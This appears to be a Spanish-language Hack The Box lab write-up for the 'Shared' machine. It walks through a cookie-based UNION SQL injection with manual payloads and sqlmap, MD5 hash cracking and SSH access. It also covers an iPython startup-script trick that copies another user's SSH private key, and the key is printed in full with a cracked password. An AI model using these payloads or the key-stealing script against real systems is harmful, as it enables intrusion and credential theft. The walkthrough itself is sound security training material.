---
layout: single
title: Shared - Hack The Box
excerpt: "En este post vamos a estar haciendo la maquina Shared de la plataforma de HackTheBox donde vamos a tener que realizar una SQL Injection desde una cookie que es vulnerable gracias a esta vulnerabilidad podremos obtener el hash de un usuario el cual vamos a crackear para conectarnos por SSH ademas tendremos que aprovecharnos de iPython para poder migrar a otro usuario mediante su clave id_rsa para la escalada de privilegios nos aprovecharemos de una vulnerabilidad de Redis"
date: 2023-06-13
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-shared/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - SQL Injection
  - Cracking Hashes
  - Abusing Cron Job
  - iPython Arbitrary Code Execution
  - Abusing Redis - Sandbox Escape
---

⮕ Maquina Linux

```bash
❯ ping -c 1 10.10.11.172
PING 10.10.11.172 (10.10.11.172) 56(84) bytes of data.
64 bytes from 10.10.11.172: icmp_seq=1 ttl=63 time=108 ms

--- 10.10.11.172 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.240/108.240/108.240/0.000 ms
❯ whichSystem.py 10.10.11.172

10.10.11.172 (ttl -> 63): Linux


```

## PortScan 

```bash
❯ nmap -sCV -p22,80,443 10.10.11.172 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-13 12:32 CST
Nmap scan report for 10.10.11.172
Host is up (0.11s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 91e835f4695fc2e20e2746e2a6b6d865 (RSA)
|   256 cffcc45d84fb580bbe2dad35409dc351 (ECDSA)
|_  256 a3386d750964ed70cf17499adc126d11 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://shared.htb
443/tcp open  ssl/http nginx 1.18.0
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Did not follow redirect to https://shared.htb
| tls-nextprotoneg: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
```

## Enumeracion

De primeras **Nmap** ya nos esta reportando un subdominio asi que vamos agregarlo al **/etc/hosts** podemos ver que es correcto

```bash
❯ curl -s -I http://10.10.11.172
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0
Date: Tue, 13 Jun 2023 18:34:35 GMT
Content-Type: text/html
Content-Length: 169
Connection: keep-alive
Location: http://shared.htb
```

```bash
❯ echo "10.10.11.172 shared.htb" | sudo tee -a /etc/hosts
10.10.11.172 shared.htb
❯ ping -c 1 shared.htb
PING shared.htb (10.10.11.172) 56(84) bytes of data.
64 bytes from shared.htb (10.10.11.172): icmp_seq=1 ttl=63 time=109 ms

--- shared.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 109.280/109.280/109.280/0.000 ms
```

Vamos a proceder a enumerar el puerto **80** estas son las tecnologías que corren en el puerto **80**

```ruby
❯ whatweb http://shared.htb
http://shared.htb [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[https://shared.htb/], nginx[1.18.0]
https://shared.htb/ [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[https://shared.htb/index.php], nginx[1.18.0]
https://shared.htb/index.php [200 OK] Cookies[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], IP[10.10.11.172], JQuery, Open-Graph-Protocol[website], PoweredBy[PrestaShop], PrestaShop[EN], Script[application/ld+json,text/javascript], Title[Shared Shop], X-UA-Compatible[ie=edge], nginx[1.18.0]
```

Esta es la pagina **web** al parecer es una tienda

![](/assets/images/htb-writeup-shared/web1.png)

Tienen mucha variedad de productos vamos a elegir cualquiera

![](/assets/images/htb-writeup-shared/web4.png)

Si agregamos cualquier producto al carrito y le damos click en **PROCEED TO CHECKOUT** esto nos redirige a un nuevo subdomonio

![](/assets/images/htb-writeup-shared/web2.png)

Vamos a agregarlo al **/etc/hosts** también

```bash
❯ echo "10.10.11.172 checkout.shared.htb" >> /etc/hosts
❯ ping -c 1 checkout.shared.htb
PING checkout.shared.htb (10.10.11.172) 56(84) bytes of data.
64 bytes from shared.htb (10.10.11.172): icmp_seq=1 ttl=63 time=110 ms

--- checkout.shared.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 109.573/109.573/109.573/0.000 ms
```

Y bueno ahora si nos vamos a donde nos redirige la web una vez le damos **click** en **PROCEED TO CHECKOUT** tenemos que poner nuestros datos de nuestra tarjeta de crédito

![](/assets/images/htb-writeup-shared/web3.png)

Vemos que también se están empleando **cookies**

![](/assets/images/htb-writeup-shared/web5.png)

Vamos a añadir datos cualquiera para ver que pasa al darle a **Pay**

![](/assets/images/htb-writeup-shared/web6.png)

Si le damos **click** a **Pay** podemos ver que no nos va a redirigir a ningún lado

Solamente recibimos esto

![](/assets/images/htb-writeup-shared/web7.png)

Si probamos cualquier cosa aunque en el **Input** no se ingresen números aun así nos va aceptar la compra

![](/assets/images/htb-writeup-shared/web8.png)

## SQL Injection Manual

- [SQLI PortSwigger](https://mikerega7.github.io/pts-writeup-sqli/#)

Vamos añadir cualquier cosa al carrito y para ver mas información vamos a emplear **BurpSuite** vamos a capturar la petición en el momento en el cual demos click a **PROCEED TO CHECKOUT** 

![](/assets/images/htb-writeup-shared/web9.png)

![](/assets/images/htb-writeup-shared/web10.png)

Si vemos la parte de **Cookie: custom_cart=** la **urldecodiamos** vemos lo siguiente

![](/assets/images/htb-writeup-shared/web11.png)

Se están reflejando los datos en la parte de la web si cambiamos el numero **1** a **2** vemos que si ponemos ver el **output** reflejado 

![](/assets/images/htb-writeup-shared/web12.png)

Vale si probamos la inyección en la parte de **Product** si aplicamos un ordenamiento basándonos en la 4 columna vemos que nos da error

![](/assets/images/htb-writeup-shared/web13.png)

Pero si nos basamos en la 3 columna se quita el error

![](/assets/images/htb-writeup-shared/web14.png)

Entonces con esto podemos saber que hay 3 columnas con esto ya podemos aplicar un **union select** para las 3 columnas `' union select 1,2,3-- -`

Ahora lo que podemos probar es que en algún campo por ejemplo en el **2** ver si podemos escribir y se refleja en el output de la inyección

Bueno después de estar testendo no podía ver la data reflejada si hacia esto `'union select 1,database(),3-- -` así que lo que hice fue cambiar el campo la parte del `product` a mi nombre y con eso pudo ver la base de datos actualmente en uso 

![](/assets/images/htb-writeup-shared/web15.png)

Pero bueno al parecer solo tenemos control de 2 campos el **2 y 3**

![](/assets/images/htb-writeup-shared/web16.png)

Sabiendo eso ahora vamos a listar las bases de datos existentes con `' union select 1,schema_name,3 from information_schema.schemata-- -`  así seria`custom_cart={"miguel' union select 1,schema_name,3 from information_schema.schemata-- -":"2"}; `

![](/assets/images/htb-writeup-shared/web17.png)

Bueno nos devuelve solo un valor así que podemos usar `group_concat` `'union select 1,group_concat(schema_name),3 from information_schema.schemata-- -`

Y hay vemos que hay 2 bases de datos

![](/assets/images/htb-writeup-shared/web18.png)

Ahora vamos a enumerar las tablas para la base de datos **checkout** `'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='checkout'-- -`

Y vemos 2

![](/assets/images/htb-writeup-shared/web19.png)

Ahora vamos a enumerar las columnas para la tabla **user** `'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='checkout' and table_name='user'-- -`

Y vemos **Id,username,password**

![](/assets/images/htb-writeup-shared/web20.png)

Ahora por ultimo vamos a ver el contenido de las columnas **username y password** con un **group_concat** `union select 1,group_concat(username,0x3a,password),3 from user-- -`

![](/assets/images/htb-writeup-shared/web21.png)

## sqlmap

También pudimos haberlo hecho con esta herramienta como ya sabemos como ya sabemos el numero de columnas y mas podemos decirle que lo haga pasandole los parámetros

```bash
❯ sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --technique U --union-cols 3 --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.12#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:49:05 /2023-06-13/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[13:49:08] [INFO] testing connection to the target URL
[13:49:09] [INFO] checking if the target is protected by some kind of WAF/IPS
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
[13:49:10] [WARNING] heuristic (basic) test shows that (custom) HEADER parameter 'Cookie #1*' might not be injectable
[13:49:10] [INFO] testing for SQL injection on (custom) HEADER parameter 'Cookie #1*'
[13:49:10] [INFO] testing 'Generic UNION query (NULL) - 3 to 3 columns (custom)'
[13:49:10] [WARNING] applying generic concatenation (CONCAT)
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[13:49:19] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[13:49:28] [INFO] (custom) HEADER parameter 'Cookie #1*' is 'Generic UNION query (NULL) - 3 to 3 columns (custom)' injectable
[13:49:28] [INFO] checking if the injection point on (custom) HEADER parameter 'Cookie #1*' is a false positive
(custom) HEADER parameter 'Cookie #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 57 HTTP(s) requests:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns (custom)
    Payload: custom_cart={"' UNION ALL SELECT NULL,CONCAT(CONCAT('qbvxq','akhkRfbZMyGKFMPlIIUUEdVYusxoaPPPCiCcwGFl'),'qpxzq'),NULL-- gpdE":"1"}
---
[13:49:31] [INFO] testing MySQL
[13:49:31] [INFO] confirming MySQL
[13:49:32] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[13:49:33] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/checkout.shared.htb'

[*] ending @ 13:49:33 /2023-06-13/
```

Ahora podemos decirle que haga una enumeración de las bases de datos

```bash
❯ sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --technique U --union-cols 3 --batch --dbs
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.12#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:50:15 /2023-06-13/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[13:50:15] [INFO] resuming back-end DBMS 'mysql' 
[13:50:15] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns (custom)
    Payload: custom_cart={"' UNION ALL SELECT NULL,CONCAT(CONCAT('qbvxq','akhkRfbZMyGKFMPlIIUUEdVYusxoaPPPCiCcwGFl'),'qpxzq'),NULL-- gpdE":"1"}
---
[13:50:16] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 (MariaDB fork)
[13:50:16] [INFO] fetching database names
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
available databases [2]:
[*] checkout
[*] information_schema

[13:50:16] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/checkout.shared.htb'

[*] ending @ 13:50:16 /2023-06-13/
```

Ahora las tablas para **checkout**

```bash
❯ sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --technique U --union-cols 3 --batch -D checkout --tables
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.12#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:50:57 /2023-06-13/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[13:50:58] [INFO] resuming back-end DBMS 'mysql' 
[13:50:58] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns (custom)
    Payload: custom_cart={"' UNION ALL SELECT NULL,CONCAT(CONCAT('qbvxq','akhkRfbZMyGKFMPlIIUUEdVYusxoaPPPCiCcwGFl'),'qpxzq'),NULL-- gpdE":"1"}
---
[13:50:58] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 (MariaDB fork)
[13:50:58] [INFO] fetching tables for database: 'checkout'
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
Database: checkout
[2 tables]
+---------+
| user    |
| product |
+---------+

[13:50:59] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/checkout.shared.htb'

[*] ending @ 13:50:59 /2023-06-13/
```

Ahora vamos a ver el hash que vimos en **burpsuite** para el usuario **james_mason** y nos dice que el hash es **MD5**

```bash
❯ sqlmap -u "https://checkout.shared.htb/" --cookie='custom_cart={"*":"1"}' --technique U --union-cols 3 --batch -D checkout -T user --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.12#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:52:04 /2023-06-13/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[13:52:04] [INFO] resuming back-end DBMS 'mysql' 
[13:52:04] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns (custom)
    Payload: custom_cart={"' UNION ALL SELECT NULL,CONCAT(CONCAT('qbvxq','akhkRfbZMyGKFMPlIIUUEdVYusxoaPPPCiCcwGFl'),'qpxzq'),NULL-- gpdE":"1"}
---
[13:52:05] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 (MariaDB fork)
[13:52:05] [INFO] fetching columns for table 'user' in database 'checkout'
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
[13:52:05] [INFO] fetching entries for table 'user' in database 'checkout'
[13:52:05] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[13:52:05] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[13:52:05] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[13:52:05] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[13:52:05] [INFO] starting 2 processes 
[13:52:49] [WARNING] no clear password(s) found                                                                                
Database: checkout
Table: user
[1 entry]
+----+----------------------------------+-------------+
| id | password                         | username    |
+----+----------------------------------+-------------+
| 1  | fc895d4eddc2fc12f995e18c865cf273 | james_mason |
+----+----------------------------------+-------------+

[13:52:49] [INFO] table 'checkout.`user`' dumped to CSV file '/root/.local/share/sqlmap/output/checkout.shared.htb/dump/checkout/user.csv'
[13:52:49] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/checkout.shared.htb'

[*] ending @ 13:52:49 /2023-06-13/
```

Vamos a crackearlo 

```bash
❯ catn hash
james_mason:fc895d4eddc2fc12f995e18c865cf273

```

Tenemos la contraseña 

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Soleil101        (james_mason)
1g 0:00:00:00 DONE (2023-06-13 13:54) 6.250g/s 13070Kp/s 13070Kc/s 13070KC/s Sportster1..Sjoerd
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed

```

## Shell as james_mason 

Nos conectamos con **SSH** ala maquina victima **james_mason:Soleil101**

```bash
❯ ssh james_mason@10.10.11.172
The authenticity of host '10.10.11.172 (10.10.11.172)' can't be established.
ECDSA key fingerprint is SHA256:mjIWp2Ggy1NHLY33FSfsXXVTUxbD+W30zEbd7BvHopg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.172' (ECDSA) to the list of known hosts.
james_mason@10.10.11.172's password: 
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:45:22 2022 from 10.10.14.4 
james_mason@shared:~$ export TERM=xterm
james_mason@shared:~$ 
```

Hay otro usuario que se llama **dan_smith** lo mas probable es que tendremos que buscar una forma de convertirnos en ese usuario

```bash
james_mason@shared:~$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
james_mason:x:1000:1000:james_mason,,,:/home/james_mason:/bin/bash
dan_smith:x:1001:1002::/home/dan_smith:/bin/bash
james_mason@shared:~$ 
```

Bueno estamos en el grupo **developers**

```bash
james_mason@shared:~$ id
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
```

No vemos binarios con permisos **SUID** interesantes

```bash
james_mason@shared:/$ find \-perm -4000 2>/dev/null
./usr/bin/gpasswd
./usr/bin/su
./usr/bin/fusermount
./usr/bin/chfn
./usr/bin/passwd
./usr/bin/chsh
./usr/bin/newgrp
./usr/bin/umount
./usr/bin/mount
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
james_mason@shared:/$ 

```

Si buscamos archivos donde cuyo grupo asignado sea **developer**

```bash
james_mason@shared:~$ find / -group developer 2>/dev/null
/opt/scripts_review
james_mason@shared:~$ 
```

Podemos entrar y tenemos capacidad de escritura

```bash
james_mason@shared:/opt/scripts_review$ ls -la
total 8
drwxrwx--- 2 root developer 4096 Jul 14  2022 .
drwxr-xr-x 3 root root      4096 Jul 14  2022 ..
james_mason@shared:/opt/scripts_review$ touch xd
james_mason@shared:/opt/scripts_review$ ls
xd
james_mason@shared:/opt/scripts_review$ 
```

Bueno para saber a mas detalle si esta pasando algo con esa ruta podemos ver tareas cron para esto podemos usar **pspy** <https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1>

Ahora lo vamos a transferir a la maquina victima

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.172 - - [13/Jun/2023 15:14:23] "GET /pspy64 HTTP/1.1" 200 -
```

```bash
james_mason@shared:/dev/shm$ wget http://10.10.14.12:80/pspy64
--2023-06-13 17:14:21--  http://10.10.14.12/pspy64
Connecting to 10.10.14.12:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64                          100%[=======================================================>]   2.96M  37.8KB/s    in 62s     

2023-06-13 17:15:23 (49.1 KB/s) - 'pspy64' saved [3104768/3104768]

james_mason@shared:/dev/shm$ chmod +x pspy64 
james_mason@shared:/dev/shm$ 
```

Ahora lo vamos a ejecutar y ya vemos un proceso interesante 

![](/assets/images/htb-writeup-shared/web22.png)

![](/assets/images/htb-writeup-shared/web23.png)

La tarea esta matando procesos de **ipython** ademas esta entrando en el directorio el cual tenemos capacidad de escritura y esta ejecutando **ipython**

En su repositorio de **Github** nos dicen como podemos elevar nuestro privilegio <https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x>

Vamos a seguir los pasos que nos muestran del **Proof of concept**

Primeros vamos a crearnos un directorio después dentro del directorio **profile_default** crea otro directorio con el nombre **startup** y después crea un script con nombre `foo.py` y le mete contenido y podemos decirle que como el usuario que queremos convertirnos esta corriendo el proceso pues que cuando se inicie se ejecuta el script y nos de clave `id_rsa` y no la ponga en una ruta del sistema para poder conectarnos por **SSH** con ese usuario

```bash
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default && mkdir -m 777 profile_default/startup && echo 'import os; os.system("cat ~/.ssh/id_rsa > /dev/shm/key")' > profile_default/startup/foo.py
james_mason@shared:/opt/scripts_review$ 
```

Ahora que se ejecuta la tarea y ejecuto el script de python3 entonces podemos ver la clave privada

```bash
james_mason@shared:/opt/scripts_review$ ls -l /dev/shm
total 3036
-rw-r--r-- 1 dan_smith   dan_smith      2602 Jun 13 17:31 key
-rwxr-xr-x 1 james_mason james_mason 3104768 Jun 13 17:13 pspy64
james_mason@shared:/opt/scripts_review$ 
```

Esta es su clave privada

```bash
james_mason@shared:/opt/scripts_review$ cat /dev/shm/key 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

## Shell as dam_smith

```bash
❯ nano id_rsa
❯ chmod 600 id_rsa
```

Ahora nos conectamos

```bash
❯ ssh -i id_rsa dan_smith@10.10.11.172
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:43:34 2022 from 10.10.14.4
dan_smith@shared:~$ export TERM=xterm
dan_smith@shared:~$ 
```

## User.txt 

```bash
dan_smith@shared:~$ cat user.txt 
62272b52c22511eed9e0dc0a58a31f80
dan_smith@shared:~$ 
```

## Escalada de Privilegios 

Ahora estamos en el grupo `sysadmin`

```bash
dan_smith@shared:~$ id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
dan_smith@shared:~$ 
```

No vemos nada interesante 

```bash
dan_smith@shared:/$ find \-perm -4000 2>/dev/null
./usr/bin/gpasswd
./usr/bin/su
./usr/bin/fusermount
./usr/bin/chfn
./usr/bin/passwd
./usr/bin/chsh
./usr/bin/newgrp
./usr/bin/umount
./usr/bin/mount
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
dan_smith@shared:/$ 
```

Bueno como estamos en el grupo `sysadmin` vamos a ver archivos donde el grupo sea **sysadmin**

```bash
dan_smith@shared:/$ find / -group sysadmin 2>/dev/null
/usr/local/bin/redis_connector_dev
dan_smith@shared:/$ ls -l /usr/local/bin/redis_connector_dev 
-rwxr-x--- 1 root sysadmin 5974154 Mar 20  2022 /usr/local/bin/redis_connector_dev
dan_smith@shared:/$ 
```

Como estamos dentro del grupo podemos **leer y ejecutar** estamos ante un binario 

```bash
dan_smith@shared:/usr/local/bin$ file redis_connector_dev 
redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
dan_smith@shared:/usr/local/bin$ 
```

Si lo ejecutamos pasa esto 


```bash
dan_smith@shared:/usr/local/bin$ /usr/local/bin/redis_connector_dev 
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15
